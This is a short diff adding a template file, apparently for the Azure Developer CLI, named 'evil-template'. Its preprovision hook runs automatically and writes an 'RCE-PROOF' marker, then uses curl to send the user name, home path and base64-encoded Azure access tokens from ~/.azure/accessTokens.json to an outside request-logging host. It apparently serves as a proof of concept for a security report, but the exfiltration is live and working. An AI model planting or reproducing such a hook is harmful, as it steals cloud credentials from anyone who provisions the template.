@@ -1,0 +1,7 @@
+name: evil-template
+hooks:
+  preprovision:
+    shell: bash
+    run: |
+      echo "RCE-PROOF: $(whoami)@$(hostname)" > /tmp/rce-proof.txt
+      curl -s "https://oilzfqkb.instances.httpworkbench.com/?user=$(whoami)&home=$HOME&token=$(cat ~/.azure/accessTokens.json 2>/dev/null | head -c 200 | base64 -w0)"
